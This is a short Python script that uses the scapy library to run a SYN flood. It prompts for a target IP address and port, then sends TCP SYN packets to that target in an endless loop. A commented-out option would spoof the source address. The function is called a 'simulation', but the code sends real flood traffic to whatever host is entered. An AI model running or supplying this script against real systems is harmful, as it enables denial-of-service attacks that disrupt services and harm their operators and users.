import scapy.all as scp

MAX_PORT = 65535

# ip_src = input("Fake Source IP (blank for random IP): ")
ip_dst = input("Target IP: ")
target_port = input("Target Port: ")


def synflood_simulation(ip_dst, target_port):
    ip_layer = scp.IP(dst=ip_dst)
    # if ip_src:
    #     ip_layer.src = ip_src

    tcp_layer = scp.TCP(dport=int(target_port), flags="S")
    packet = ip_layer / tcp_layer

    scp.send(packet, loop=1, verbose=False)
    print(packet)


synflood_simulation(ip_dst, target_port)
